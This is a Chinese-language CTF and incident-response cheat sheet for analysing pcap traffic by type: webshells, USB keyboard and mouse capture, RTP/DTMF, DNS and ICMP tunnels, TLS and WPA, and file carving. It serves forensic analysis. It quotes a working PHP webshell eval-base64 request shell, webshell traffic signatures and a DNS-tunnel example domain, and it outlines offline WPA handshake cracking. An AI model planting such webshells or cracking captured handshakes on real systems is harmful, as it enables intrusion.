---
title: 流量分析-按种类速查
tags: [misc, 流量分析, pcap, 速查]
created: '2026-10-09T12:00:00.000Z'
modified: '2026-10-09T12:00:00.000Z'
---

# 流量分析 · 按流量种类速查

> **定位**：CTF Misc / 应急响应流量题的**按类型查表**文档。看到什么流量，翻到对应一节。
> **不重复的内容**：Wireshark 界面用法、过滤器语法、tshark 参数、常见端口表 —— 见同库 `baseknown\Wireshark使用与流量包分析基础.md`。
> **脚本位置**：`D:\python\CTF工具箱\misc\`（HTTP/webshell、USB 键鼠、文件分离、密码爆破），改顶部一行即换题。
> **本机 tshark**：`D:\网络安全工具\Wireshark\tshark.exe`（4.6.0，未入 PATH，用全路径）。

---

## 〇、进场四步（任何流量题都先走一遍）

### 0.1 协议分级 —— 定方向

```sh
# 哪个协议占大头，方向就在哪
D:\网络安全工具\Wireshark\tshark.exe -r 文件.pcapng -q -z io,phs
```

图形界面：`Statistics → Protocol Hierarchy`。

### 0.2 搜关键字 —— 碰运气

`Ctrl+F` → 选 **String** 或 **Packet bytes** → 搜 `flag`、`{`、`key`、`pass`。

### 0.3 数流 —— 看有多少条会话

```sh
tshark.exe -r 文件.pcapng -q -z conv,tcp    # TCP 会话列表，一条一行
```

会话数少（1~3 条）→ 慢慢 Follow；几十上百条 → 先找"最不像正常业务"的那条。

### 0.4 分清"包"和"流"

**一行是一个包，一条流可能是几十上百个包。** 看到一堆小包先 Follow 拼回来，别逐个看。

### 0.5 魔数验真类型 —— 导出文件第一件事

扩展名随便改，文件头骗不了人：

| 文件头(hex) | 真实类型 | 说明 |
|---|---|---|
| `FF D8 FF E0/E1` | JPEG | 图片 |
| `89 50 4E 47` | PNG | 图片 |
| `47 49 46 38` | GIF | 动图 |
| `50 4B 03 04` | ZIP（含 docx/xlsx/apk/jar） | 压缩包 |
| `52 61 72 21` | RAR | 压缩包 |
| `37 7A BC AF` | 7z | 压缩包 |
| `25 50 44 46` | PDF | 文档 |
| `7F 45 4C 46` | ELF | Linux 可执行 |
| `4D 5A` | PE/EXE | Windows 可执行 |
| `3C 3F 70 68 70`（`<?php`） | 真 PHP | 源码/木马 |
| 全是 `A-Za-z0-9+/=` | **base64 文本** | 先解码再判类型 |
| 全是 `0123456789abcdef` | hex 文本 | 先 hex 解码 |
| `%xx%xx` | URL 编码 | 先 URL 解码 |

> 核心套路：导出的文件常是「**伪装 + 编码**」双层。文件名说是 `x.php`，实际可能是 base64 的 JPEG。

---

## 一、HTTP / Web 明文流量

**识别**：`http` 过滤器有内容；或协议分级里 `http` 占大头。

### 1.1 普通 HTTP

| 看什么 | 怎么找 |
|---|---|
| 请求参数 / 响应体 | 右键 → **Follow → TCP Stream** |
| Cookie（常藏数据） | 过滤 `http.cookie` 或看 `Set-Cookie` |
| 上传/下载的文件 | **File → Export Objects → HTTP**，一键导出 |

**Cookie 可疑特征**：`exam_currentuser`、`PHPSESSID` 等值超长 → 可能是被多次 URL 编码的数据（`%25XX` 要解多层）。

### 1.2 一句话木马（明文型：蚁剑 Armitage / 中国菜刀）

**识别特征**（在 Follow 流里看到这些）：

- `POST` 到某个 `.php`，body 里有 `action=`、`z0`~`z3` 这类字段
- 或大量 `@ini_set`、`@set_time_limit`、`@set_magic_quotes_runtime`、`open_basedir`、`chdir`、`posix_getegid`、`base64_decode($_POST[...])`
- `User-Agent: Java/1.8.0_151`（蚁剑默认）
- 响应被 `->|` 和 `|<-` 包裹

**请求结构**：

```
aa=@eval(base64_decode($_POST[action]));     ← 固定外壳
&action=<base64: 木马功能代码>
&z1=<base64: 操作参数(通常是被操作的文件路径)>
&z2=<hex:  真正要上传/写入的数据>          ← 超长的那串
```

**回显结构**：

```
->| 实际输出内容 |<-
```

**解码三步**（手工在 Wireshark 里干会很痛苦）：

1. `action` → base64 解码 → 得到 PHP 代码，看它在干什么（列目录 / 读文件 / 写文件）
2. `z1` → base64 解码 → 得到目标路径
3. `z2` → 是**纯 hex 字符串** → `bytes.fromhex()` → 得到真正写入的文件

> **z2 那串几十万字符千万别手工复制**——那正是"不好复制"的部分，用脚本。

**看 `action` 代码就能判断动作类型**：

| 代码里的关键字 | 动作 |
|---|---|
| `opendir` + `readdir` | 列目录 |
| `fopen($F,"r")` + `fread` | 读文件 |
| `fopen($f,"w")` + `fwrite` | **写文件（上传）** |
| `posix_getegid` / `php_uname` | 基本信息（看当前目录、系统、权限） |

### 1.3 加密木马（冰蝎 Behinder / 哥斯拉 Godzilla）

**和 1.2 的区别**：蚁剑/菜刀是 **base64 明文**，冰蝎/哥斯拉是 **AES 加密的字节流**。

| | 蚁剑 / 菜刀 | 冰蝎 | 哥斯拉 |
|---|---|---|---|
| 请求体长相 | 表单 `action=&z1=&z2=` + base64 | 一坨**乱码字节**，Content-Type 常是 `application/octet-stream` | 一坨乱码，参数名固定为 `pass=` |
| 解密方式 | base64 / hex 直接解 | AES，key = md5(密码) 前 16 字节 | AES 或 XOR，密钥由 payload 里的 key 派生 |
| 怎么认 | 一眼看出 | 请求/响应等长、不可读 | 同左 |
| 解密前提 | 无 | 需要**密码**（题目一般会给，或在 webshell 源码里） | 需要从服务端脚本里抠出 key |

**处理流程**：先导出木马文件本身（`Export Objects`）→ 读源码拿密码/密钥 → 写脚本把每个请求体 base64 解一层 → AES 解密 → 前 2 字节是 `1f 8b` 则 gzip 解压 → 得到明文命令。

> 典型实战见 `应急响应杂项\03-流量分析\Webshell上传与加密隧道分析WriteUp.md`（XOR + Base64 + gzip 三层，密钥 `3c6e0b8a9c15224a`）。

### 1.4 加密隧道（无回显特征）

木马把命令执行结果通过一个**独立程序**（`back.exe` 之类）回传时，表现为：请求/响应都是**等长 1460 字节**（TCP MSS 满包）的不可读数据。

**识别**：TCP 会话列表里出现两方持续互传 1400+ 字节的流，且没有任何 HTTP 可读内容。
**处理**：抓不到密钥就到此为止——转去分析**同一台机器上更早的明文流量**（命令是怎么下发的）。

### 1.5 代理 / 一个字符一个包

**识别**：常见代理端口 `7890`、`1080`；每个包只带 1 字节；会话数极少。
**处理**：Follow 那条流 → 拼回完整文本即可。

### 1.6 HTTP 文件外带（Export Objects）

菜单 **File → Export Objects → HTTP**，把列表里所有对象导出来，然后按 0.5 节验真类型。

同理还有 **SMB / TFTP / FTP-DATA / DICOM** 各自的 Export Objects 入口，按协议分级的结果选。

---

## 二、USB HID 流量（超高频考点）

> 主流常考题型，不是偏题。固定套路：**找设备 → 抽 `usbhid.data` / `usb.capdata` → 按字节布局解析 → 还原按键/轨迹。**

### 2.1 三条铁律

1. **先分清键盘还是鼠标**：键盘 8 字节、第 3 字节是按键码；鼠标 8 字节、含 X/Y 相对位移。
2. **鼠标报的是"相对位移"不是坐标**：必须逐包累加；`按键=0`（抬笔）时要**断开笔画**，否则连出满屏长直线。
3. **字节布局不统一**：X/Y 在第几字节各鼠标不同，认不准就把偏移换着试。

### 2.2 找设备

```sh
# 协议分级里出现 usb 且大量 interrupt 包 → USB HID 题
tshark.exe -r 文件.pcapng -q -z io,phs
```

在 Wireshark 里看 `usb.src`，**包最多、每包等长**的那个设备就是目标。

### 2.3 抽 HID 数据

```sh
# 新版字段 usbhid.data，老版 usb.capdata，两个都试
tshark.exe -r 文件.pcapng -Y 'usb.src=="1.2.1"' -T fields -e usbhid.data
```

得到一串十六进制，键盘/鼠标通常是 **16 个 hex = 8 字节**。

> **坑**：同一份包里可能 `usbhid.data` 全空、数据只在 `usb.capdata` 里。

### 2.4 判字节布局

| 设备 | 常见布局（8 字节） |
|---|---|
| 键盘 | `[修饰键, 保留, 键码1, 键码2, 键码3, 键码4, 键码5, 键码6]` |
| 鼠标(8B) | `[按键, ?, X位移, ?, Y位移, ?, 滚轮, ?]` |
| 鼠标(4B) | `[按键, X位移, Y位移, 滚轮]` |
| 鼠标(6B) | `[按键, X位移, Y位移, ...]` |

**判断技巧**：某字节只取 `0/255` 两个值 → 多半是 16 位补码的高字节（符号位）；某字节几乎恒为 0 → 填充位。

### 2.5 键盘

**键码表（常用）**：

| 键码 | 字符 | 键码 | 字符 |
|---|---|---|---|
| 0x04–0x1D | a–z | 0x1E–0x26 | 1–9,0 |
| 0x28 | Enter | 0x2C | 空格 |
| 0x2D | `-` | 0x2E | `=` |
| 0x2F | `[` | 0x30 | `]` |
| 0x33 | `;` | 0x34 | `'` |
| 0x36 | `,` | 0x37 | `.` |
| 0x38 | `/` | 0x39 | CapsLock |

修饰键位：bit0=LCtrl，bit1=LShift，bit2=LAlt，bit3=LMeta（右侧是高位）。
**坑**：同一个键会重复出现多个包（按住），要**去重**。

**必须"回放编辑"（最容易漏的一步）**：

作者**不是一次性敲完**，末尾常有 **Backspace(0x2A) 删错字、方向键(0x4F 右 / 0x50 左) 移动光标再插字**。
只做"去重 + 查表拼接"会得到含错字的垃圾，必须**按时间顺序模拟一个文本光标**：

```python
buf, cur = [], 0          # buf=文本, cur=光标位置
for mod, k in events:     # events = 去重后的 (修饰键, 键码) 序列
    if   k == 0x2a:       # Backspace: 删光标前一个
        if cur > 0: del buf[cur-1]; cur -= 1
    elif k == 0x50:       # Left
        cur = max(0, cur-1)
    elif k == 0x4f:       # Right
        cur = min(len(buf), cur+1)
    else:                 # 普通字符: 插到光标处
        ch = key_to_char(mod, k)
        if len(ch) == 1: buf.insert(cur, ch); cur += 1
print("".join(buf))
```

> **判断技巧**：末尾出现 `50 50 50...`（左箭头连按）+ `2a`（退格）基本就是"定位改错字"，老老实实回放，别猜。

**现成脚本**：`D:\python\CTF工具箱\misc\10-USB键盘流量还原文本.py`（自动选设备/字段，输出去重序列 + 回放编辑后文本 + 疑似 flag）

### 2.6 鼠标

```python
def s8(v):                       # 补码：>127 视为负数
    return v - 256 if v > 127 else v

x = y = 0
pts = []
for h in hexlines:               # 每行 16 个 hex
    b = bytes.fromhex(h)
    x += s8(b[2])                # X 位移（第 2 字节）
    y += s8(b[4])                # Y 位移（第 4 字节）
    pts.append((x, y, b[0]))     # b[0]=按键

# 画图时：pressed==0 就断开笔画，别连线
```

**现成脚本**：`D:\python\CTF工具箱\misc\08-USB鼠标流量还原轨迹.py`（改 `PCAP/DEVICE` 两行，输出 `mouse_0~3.png` 四种翻转）

**看图要点**：
- **Y 轴方向相反**：USB 鼠标 Y 正方向常与屏幕相反 → 图上下颠倒，试翻转
- **镜像**：作者可能画的时候左右/上下镜像，一次输出 4 种翻转挑能看清的
- **轨迹里两行字**：可能是"抬笔后光标跳行"，按笔画顺序读，别按视觉上下顺序

### 2.7 USB 其他类型

| 类型 | 识别 | 处理 |
|---|---|---|
| USB 存储 | URB_BULK 大段数据 | 提取扇区镜像，binwalk 找文件系统 |
| 触摸板/数位板 | 与键盘同设备混发 | 靠字节特征区分，别拿鼠标脚本硬画 |

---

## 三、RTP / VOIP 音频流量

> RTP（实时传输协议，RFC 3550）跑在 **UDP** 上，通常和 **SIP 信令**、**RTCP 控制**同时出现。
> 固定套路：找 RTP 流 → 看 PT 编码 → 还原音频听 / 解 RFC2833 事件包。

### 3.1 三条铁律

1. **flag 两种藏法**：①真人语音念出来（Wireshark 直接播）；②DTMF 按键音（听音高 / 解 PT=101 事件包）。**先看包里有没有 PT=101，有就直接读字节，不用听。**
2. **双流别听错**：一通电话是**两条对称流**（A→B 和 B→A，SSRC 不同）。一条可能是静音/回声，播不出东西先换另一条。
3. **PT 是关键**：别死磕非常规 PT 的流。

### 3.2 确认 + 找流

```sh
tshark.exe -r 文件.pcap -q -z io,phs      # 大量 UDP + rtp + sip → VOIP 题
```

Wireshark 里过滤 `rtp || sip || rtcp`。SIP 信令（`Session Initiation Protocol`）里能看到通话双方、编码协商（`rtpmap:0 PCMU/8000`），偶尔直接藏提示。

### 3.3 流列表 → 播放（图形化主力）

1. 菜单 **电话(Telephony) → RTP → RTP 流列表(RTP Streams)**
2. 列出所有流（源/目的/SSRC/包数/PT），**先选包数最多的**
3. 点 **分析(Analyze) → 播放流(Play Streams)** → 戴耳机听

> Play 出来全是噪音：检查 PT 是不是音频编码；对端流换着试；采样率确认 8000。

### 3.4 看 PT 决定走哪条路

| PT | 含义 | 处理 |
|---|---|---|
| 0 | G.711 μ-law (PCMU) | 还原 WAV 听 |
| 8 | G.711 a-law (PCMA) | 还原 WAV 听 |
| 9 | G.722 | 还原 WAV 听（采样 16000） |
| **101** | **telephone-event (RFC2833)** | **直接解析 payload 首字节 = DTMF 按键**，不用听 |
| 96~99 | 动态 PT（SDP 里 rtpmap 定义） | 看 SIP 信令里协商成了什么 |
| 72/73 | 非常规值 | 大概率**烟雾弹**（零星几个包），排除 |

### 3.5 RFC2833 DTMF 事件包（有就白送）

PT=101 的包 payload 是 **4 字节**：

```
[事件编号(1B)] [E|音量|保留(1B)] [持续时间(2B, 大端)]
```

**事件编号表**：0~9 → 按键 `0~9`，10 → `*`，11 → `#`，12~15 → `A~D`。

同一个按键会连发多个包（开始+持续+End 位=1 的收尾包），**按事件编号去重**后连起来就是拨号序列。

```sh
tshark.exe -r 文件.pcap -Y rtp -T fields -e rtp.payload
tshark.exe -r 文件.pcap -Y "rtp.p_type==101" -T fields -e rtp.payload   # 直接看按键
```

### 3.6 RTP 包结构（定位字段用）

```
[0]    V(2bit)=2 | P | X | CC(4bit)     ← 版本必须是 2，不是 2 的不是 RTP
[1]    M(1bit) | PT(7bit)               ← 载荷类型在这
[2:4]  序列号(16bit)                     ← 排序去重
[4:8]  时间戳(32bit)
[8:12] SSRC(32bit)                      ← 同一媒体流唯一标识
[12+]  CSRC(CC个) / 扩展头 / payload      ← 音频数据或 DTMF 事件
```

### 3.7 音频里的 DTMF（没有 101 包才需要）

还原出的 WAV 若是按键音：用 [DTMF 在线识别](https://www.dialabc.com/sound/detect/)，或自己实现 Goertzel 检测。

频率表：低频组 `697/770/852/941` × 高频组 `1209/1336/1477`，组合对应 12 个按键。

> **payload → WAV 不能直接改名**：G.711 payload 是**裸采样**，要么按 μ-law/a-law 解码成 PCM 再包 WAV 头，要么 `ffmpeg -f mulaw -ar 8000 -i out.raw out.wav`。改后缀是放不出声的。

---

## 四、隧道 / 隐蔽信道类

> 特征：**正常业务不该传数据的地方却在传数据**，或**协议字段明显异常**。

### 4.1 DNS 隧道

**识别**：

- 某个域名下大量**超长随机子域名**（如 `aGVsbG8.badguy.com`）
- 大量 **TXT** 记录查询（TXT 能塞几百字节）
- 同一域名被高频查询

**过滤器**：`dns`、`dns.qry.name`

**处理**：

```sh
# 抽所有查询名
tshark.exe -r 文件.pcap -Y "dns.flags.response==0" -T fields -e dns.qry.name
```

按**时间顺序**取子域名的最前面那截 → base32/hex 解码 → 拼接 → 拿数据。

**变体**：子域名逐字符拼 flag（每个包一个字符，如 `a.flag.com`、`b.flag.com`…）→ 直接按顺序取首字母。

### 4.2 ICMP 隧道

**识别**：

- ICMP 包数量异常多，且 `data` 段有内容（正常 ping 的 data 是固定填充）
- 请求和响应 data 长度一致且都很大

**过滤器**：`icmp`、`icmp.type==8`（请求）

**处理**：

```sh
tshark.exe -r 文件.pcap -Y "icmp.type==8" -T fields -e data.data
```

把所有 payload 按序拼起来 → hex 解码 → 常得到文件。ICMP 的 `data` 段一次能带 32~1400 字节，比 DNS 快。

### 4.3 其他隐蔽信道

| 藏在哪 | 怎么发现 | 怎么取 |
|---|---|---|
| **IP ID 字段** | `ip.id` 递增/有规律 | 抽 `ip.id` 当字节流 |
| **TCP 窗口 / 序列号** | `tcp.window_size` 值杂乱 | 抽该字段 |
| **TTL** | `ip.ttl` 只有几个取值 | 抽 `ip.ttl` 映射成 bit |
| **包长度** | 长度就是 ASCII（如 102=`f`） | 抽 `frame.len` 序列 |
| **TCP 标志位** | flags 组合有规律 | 抽 `tcp.flags` |
| **时间间隔** | 包间隔长短 = 0/1 | 算 delta 时间映射成 bit |
| **分片** | `ip.frag_offset` 有异常 | 手动重组 |
| **HTTP 特定头** | 头的顺序/大小写异常 | 按序取 |

```sh
# 通用抽字段模板
tshark.exe -r 文件.pcap -Y "条件" -T fields -e 字段名
```

---

## 五、加密流量

### 5.1 TLS / HTTPS 解密

**没有密钥就解不了**，这是硬限制。有三条路：

| 方法 | 前提 | 做法 |
|---|---|---|
| **SSLKEYLOGFILE** | 有浏览器导出过会话密钥 | 环境变量 `SSLKEYLOGFILE=keys.log`，让浏览器跑一遍；Wireshark `Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename` 指向该文件 |
| **RSA 私钥** | 服务器私钥 + **非** ECDHE 套件 | Preferences → TLS → RSA keys list 添加 `IP,端口,http,私钥文件` |
| **题给 keylog** | 题目直接提供 | 同第一行配置 |

> 现代网站几乎全用 ECDHE 前向保密 → **私钥法失效**，只能靠 keylog。

**解不开时的思路**：题目的答案往往不在 TLS 层里。去看**同时间段的明文流量**（HTTP 上是不是先下发了什么东西）、看**证书里的域名**（`tls.handshake.extensions_server_name`）、看**流量大小与时间模式**。

### 5.2 WPA / WPA2 无线握手

**识别**：协议分级出现 `802.11`；过滤 `eapol` 能看到 4 次握手包。

**处理**：

1. 抽 SSID：`wlan.ssid` / 过滤 `wlan.fc.type_subtype==8`（Beacon）
2. 确认抓齐 EAPOL 4 次握手（至少 1、2、4）
3. 导出成 hashcat/aircrack 格式，**离线爆破**（字典或 PIN）

**变体**：只考"找 SSID"或"找隐藏的 SSID"（Beacon 里 SSID 长度为 0，但要靠 probe response 或关联请求找）。

---

## 六、文件提取（怎么把包里的文件挖出来）

> **一句话总纲**：不管什么协议，文件字节最终都是**连续躺在 TCP/UDP payload 里**的。所以只有两条路 ——
> **① 让 Wireshark 帮你按协议重组**（Export Objects，最快）；
> **② 不认识协议就按魔数硬扫**（整个 pcap 当字节流搜文件头，等价 foremost）。

### 6.1 先判断：文件藏在哪种"载体"里

| 载体 | 典型协议 | 特征 | 提取入口 |
|---|---|---|---|
| **独立文件传输** | FTP / TFTP / SMB | 除控制连接外还有一条**独立数据连接** | Export Objects → 对应协议 |
| **HTTP 下载/上传** | HTTP | `Content-Type` 是 octet-stream 或附件 | Export Objects → HTTP |
| **邮件附件** | SMTP / POP3 / IMAP | body 里有 MIME `Content-Disposition: attachment` | 手工 Follow 或 Export Objects |
| **协议里夹带** | 任意 | 文件字节混在请求参数（webshell 的 z2） | `14-编码数据抠图` 脚本 |
| **自定义/加密隧道** | 私有协议 | 看不出协议名，`_ws.col.Protocol` 显示 TCP/UDP/data | `11-文件分离` 硬扫 |

### 6.2 方法一：Export Objects（首选，但要"认得出来"）

```
File → Export Objects → ⬇ 选一个
    HTTP            网页/下载的文件
    SMB             共享目录里的文件
    TFTP / FTP-DATA TFTP、FTP 传输的文件
    DICOM           医疗影像
```

**导出后第一件事**：按 0.5 节验魔数，**不要信扩展名**。

> **什么时候是空的？** 见下面这个真实的坑 👇

#### ⚠️ 坑：FTP-DATA 导出对话框里什么都没有

**现象**：明明在 `ftp` 过滤里看到 `RETR xxx.rar`，打开 Export Objects → FTP-DATA 却是空白列表。

**原因**：FTP 的数据连接是**动态端口**（由 `PORT`/`PASV` 命令临时协商），Wireshark 要靠「控制连接上捕获到的 PORT 命令」去**动态注册**这条数据连接。如果控制连接本身不规范（典型：**两端端口都不是 21**，如某题控制连接是 `7837 ↔ 21`），这套关联就建立不起来 → 数据流只被当作普通 `TCP`。

**先确认是不是这个原因**：

```sh
D:\网络安全工具\Wireshark\tshark.exe -r 文件.pcapng -Y "ftp-data" -T fields -e frame.number
# 输出 0 行 → 就是没识别出来，别再跟导出对话框较劲
```

**三条替代路线**：

```sh
# 路线A：命令行走 Follow（跟 GUI 的 Follow Stream 等价）
tshark -r 文件.pcapng -q -z follow,tcp,raw,6

# 路线B：直接抽 payload（推荐，最干净）
tshark -r 文件.pcapng -Y "tcp.port==7842 && ip.src==172.16.80.153 && tcp.len>0" \
  -T fields -e tcp.payload | tr -d '\r\n' | xxd -r -p > out.rar
#                            ↑ tr 先删换行，否则 hex 串被劈开  ↑ xxd -r -p 把 hex 还原成字节

# 路线C：按魔数硬扫（不认识协议也能用）
py 11-文件分离.py      # 改顶部 FILE 一行
```

> **`tcp.len>0` 一定要加** —— 否则会把 ACK 空包（`Len=0`）也带上。
> **FTP 的 `PORT` 命令是三段式**：`PORT a,b,c,d,p1,p2` → 端口 `= p1*256+p2`（如 `30,158` → `7838`），别当十进制读。

### 6.3 方法二：GUI 里 Follow → TCP Stream（手把手）

**操作**（以挖出压缩包为例）：

1. **定位**：显示过滤器输入 `tcp.port==7842`（或直接点到那个 `Len=196` 的数据帧）
2. **右键那一帧 → `Follow ▸ TCP Stream`**
3. **切换视图**：窗口右下角 `Show data as` 下拉框，从 `ASCII` 改成 **`Raw`**
4. **另存**：点 `Save as...`，文件名写 `out.rar`（类型选 All Files，别让它自动加 `.txt`）

**为什么第 3 步最关键**：

ASCII 视图会把**所有非可打印字节显示成一个点 `.`**。以一个 196 字节的 RAR 为例：

| | 字节数 | 占比 |
|---|---|---|
| 可打印 | 65 | 33% |
| **不可打印** | **131** | **67%** |

```
hex  : 526172211a0700ce997380000d00000000000000453fe1984de813ddf0543595
ASCII: Rar!.....s..........E?..M....T5.
        ↑↑↑↑  ↑          ↑↑↑↑      ↑↑↑↑
      能还原  这里的 ce 99 73 80 00 0d 00 全被点号抹掉了
```

**在 ASCII 视图下保存 = 存一个被打码的残缺文件**，解压必然报错。**Raw 才是原始字节。**

> Follow 的视图选项：`ASCII`（看文本，非文本变点号）/ `EBCDIC`（大型机）/ **`Raw`（存二进制必须用这个）** / `C Arrays` / `Hex Dump`。

**注意方向**：如果**两个方向都有数据**（如 HTTP 一来一回），Follow 会把它们**按顺序混在一起**，存下来是废的。此时在过滤器里限定方向：
`tcp.stream==6 && ip.src==172.16.80.153`（只取服务器→客户端）。

### 6.4 方法三：按魔数硬扫（不依赖协议解析）

把**整个 pcap 当字节流**搜文件头，找到就按该格式的结束标志切片。**等价于 `foremost` / `binwalk -e`，但纯 Python 不用装工具。**

```sh
py 11-文件分离.py      # 改顶部 FILE 一行 → 输出 carve_out/
```

原理与要点：

- **为什么能扫到**：文件传输的 payload 在 pcap 里是**按包顺序连续追加**的，所以文件字节就是一段连续内存。
- **每个格式怎么定尾**：

| 格式 | 结尾标志 | 是否精确 |
|---|---|---|
| JPEG | `FF D9` | ✅ 精确 |
| PNG | `IEND` + 4 字节 CRC | ✅ 精确 |
| GIF | `3B` | ✅ 精确 |
| BMP | 文件头 2~6 字节里写了总长 | ✅ 精确 |
| PDF | `%%EOF` | ✅ 精确 |
| ZIP | 文件尾的中央目录结束记录 `PK\x05\x06` | ✅ 精确 |
| **RAR / 7z / GZIP** | 算不出 → **切到文件尾** | ⚠️ 带尾巴 |

**RAR 为什么不要试图解析块结构**：抓包里传的 RAR **头部字段常常不完整**。实测某题的 RAR 声明 header size = 5096，而文件实际只有 196 字节（抓包时还没写完/被截断），照块结构算必然错。而 **7-Zip / WinRAR 都能容忍 RAR 尾部的多余字节**，所以"切到文件尾"反而是正确的省事做法。

**假阳性**：2 字节签名（`BM`=BMP、`MZ`=PE）最容易误命中。筛选原则：**优先看偏移最大、体积合理的那个**；打不开的就是假的。

### 6.5 方法四：Kali 的 foremost / binwalk（题目原解常用）

```sh
foremost -i 文件.pcapng          # 输出到 output/ 下按类型分目录
binwalk -e 文件.pcapng           # 加 -e 自动提取
```

**优点**：完全不依赖协议；**缺点**：不精确、假阳性多（长得像魔数的随机数据会被切出来）。
本机没装（`command -v foremost` 为空），所以上面 `15-` 脚本就是它的本地替代品。

### 6.6 各种"藏文件"手法对照表

| 藏着的手法 | 怎么发现 | 怎么挖 |
|---|---|---|
| **独立数据连接传文件** | 看 `PORT`/`PASV`，找非标准端口的会话 | Export Objects 或抽 `tcp.payload` |
| **协议里 hex/base64 编码** | 看到 `z2=FFD8...`、`/9j/4AAQ` 这种长串 | `14-编码数据抠图` |
| **文件头伪装**（`.php` 其实是图片） | 验魔数 | 直接改名/解码 |
| **尾部追加**（图片后面跟个 zip） | `strings` / 扫魔数 | `11-文件分离` |
| **分片/重组** | 一个文件跨多条流、多个包 | Follow Stream 或按 stream 号分别抽 |
| **压缩后再编码**（gzip → base64） | 解码后是 `1F 8B` | 解两层 |
| **加密隧道里**（冰蝎/哥斯拉/`back.exe`） | 等长 1460 字节的不可读流 | 需要密钥，拿不到就放弃这层 |
| **整个 pcap 就是一个文件** | 魔数在偏移 0 | 直接改扩展名 |

### 6.7 提取 ≠ 解密

务必分清两步：

```
提取（把字节从包里弄出来）  →  解密/解压/解码（把字节变成可读内容）
   Follow Stream / 抽 payload        7z 解压、base64 解码、AES 解密、爆密码
```

**挖出来的压缩包有密码是常态**，这不算失败。接 `12-密码爆破.py` / `密码爆破.py`。

---

## 七、脚本索引（`D:\python\CTF工具箱\misc\`）

| 脚本 | 什么时候用 | 改哪里 |
|---|---|---|
| `16-流量包导出-HTTP与蚁剑webshell.py` | pcap 里有 HTTP 流量、尤其**蚁剑式 webshell** | 顶部 `PCAP` 一行 |
| `14-编码数据抠图-hex与base64还原.py` | **流量/网页/日志里有 hex 或 base64 编码的文件**（图片、压缩包） | 顶部 `SRC` 一行 |
| `08-USB鼠标流量还原轨迹.py` | USB 鼠标题 | `PCAP` / `DEVICE` 两行 |
| `10-USB键盘流量还原文本.py` | USB 键盘题（含回放编辑） | `PCAP` / `DEVICE` 两行 |
| `11-文件分离.py` | **看得出包里有文件但不知道从哪挖**；Export Objects 为空时；图片尾部追加 | `FILE` 一行 |
| `12-RAR密码爆破.py` / `密码爆破.py` | 加密压缩包（纯数字/字典） | 数据行 |
| `03-文件类型识别与strings.py` | 导出文件后验真类型 | `FILE` 一行 |
| `06-像素取色与LSB提取.py` | 图片 LSB 隐写 | `FILE` 一行 |

**`11-文件分离.py` 的切片策略**（输入可以是图片、文档，**也可以是 pcap**）：

| 格式 | 结尾怎么定 | 切出来 |
|---|---|---|
| JPEG | 找 `FF D9` | ✅ 精确 |
| PNG | 找 `IEND`+4CRC | ✅ 精确 |
| GIF | 找 `3B` | ✅ 精确 |
| BMP | 读文件头里的总长 | ✅ 精确 |
| PDF | 找 `%%EOF` | ✅ 精确 |
| ZIP | 找尾部中央目录 `PK\x05\x06` | ✅ 精确 |
| **RAR / 7z / GZIP** | 算不出 → 切到文件尾 | ⚠️ 带尾巴 |

> **为什么 ZIP 必须精确定尾**：ZIP 的中央目录在**文件尾**，多塞垃圾会让 7z 直接报错打不开。
> **RAR 为什么不用精确定尾**：抓包里的 RAR 头部长度字段常不完整（实测某题声明 header size=5096 而文件只有 196 字节），解析块结构必错；而 7z/WinRAR 能容忍尾部多余字节。


**`16-流量包导出` 干了什么**：一条命令把 HTTP 流量全落地 ——

- `requests.txt`：所有请求一览 + webshell 的路径/代码/还原结果
- `webshell/`：拆出每条木马请求的 `z1`（路径）、`action`（PHP 代码）、`z2`（**自动 hex 还原成真实文件**）
- `http_objects/`：每个响应体单独成文件（等价 Export Objects HTTP）
- `streams/`：每条 TCP 流原始字节（等价 Follow → TCP Stream → Save as）

**依赖**：纯 Python + **scapy**，不调 tshark / Wireshark。`py -m pip install scapy`。

---

## 八、常见坑（汇总）

1. **包 ≠ 流**：一行一个包，一条流可能几十上百包。看到一堆小包先 Follow。
2. **一个字符一包**：代理流量常见（7890 等端口），Follow 拼回即可。
3. **flag 不一定是明文**：可能是多层编码（URL → base64 → 再 URL），解一层看不出来就再解。
4. **导出文件必须验真类型**：别信扩展名，用魔数。
5. **USB 脚本"没输出"先查设备地址和字段名**，别查路径 —— 设备写错一个字就一个包都抓不到。
6. **`usbhid.data` 与 `usb.capdata` 都要试**，同一份包里可能一个空一个满。
7. **键盘题漏"回放编辑"**：末尾方向键+退格是在改错字，不回放 flag 里全是错字。
8. **鼠标轨迹别连线穿过抬笔**，并试 4 种翻转。
9. **RTP 先过滤 `rtp.p_type==101`**，有就不用听音频。
10. **RTP 注意烟雾弹流**：包数少 + PT 非常规 + SSRC 扎堆 = 干扰。
11. **加密流量先判断"能不能解"**：ECSHE/ECDHE 套件拿私钥也没用，果断转别的层。
12. **不要手工复制 z2 那种几十万字符的字段**，用脚本。
13. **Export Objects 是空的 ≠ 包里没文件**：先 `tshark -Y "ftp-data"` 数帧数，0 帧说明协议没识别出来（动态端口的 FTP 最常见），改走 Follow Stream 或魔数硬扫。
14. **Follow Stream 存文件必须切 `Raw`**，ASCII 视图会把所有不可打印字节变成点号，存下来是残缺文件。
15. **Follow 到多方向流量要限定方向**，否则两个方向的数据被混在一起。
16. **`tr -d '\r\n'` 不能省**：tshark 每行输出一个包，行尾换行会把 hex 串劈开，不删就解出乱码。
17. **RAR 的构造器不能信**：抓包里的 RAR 头部长度字段常不完整，别解析块结构，直接切到文件尾（7z/WinRAR 能容错）。

---

## 九、实战记录

### 通用技巧：编码数据抠图（认签名 → 解码 → 验魔数）

| 编码 | 开头长这样 | 怎么解 |
|---|---|---|
| hex | `ffd8ffe0...` / `89504e47...`（全 0-9a-f 且长度为偶） | `bytes.fromhex(s)` |
| base64 | `/9j/4AAQ...` / `iVBORw...` / `UEsDBA...` | `base64.b64decode(s)` |
| data URI | `data:image/jpeg;base64,/9j/4AAQ...` | 去掉前缀再 base64 解码 |
| URL 编码 | `%FF%D8%FF%E0` | `urllib.parse.unquote_to_bytes(s)` |

**魔数 ↔ base64 前缀对照**（记前缀比记字节快，一眼扫描就能认出来）：

| hex 开头 | base64 开头 | 类型 |
|---|---|---|
| `ffd8ff` | `/9j/` | JPEG 图片 |
| `89504e47` | `iVBORw` | PNG 图片 |
| `47494638` | `R0lGOA` | GIF 动图 |
| `424d` | `Qk0` | BMP 图片 |
| `504b0304` | `UEsDBA` | ZIP 压缩包 |
| `526172211a07` | `UmFyIRoH` | RAR |
| `377abcaf271c` | `N3q8rycc` | 7z |
| `25504446` | `JVBERg` | PDF |
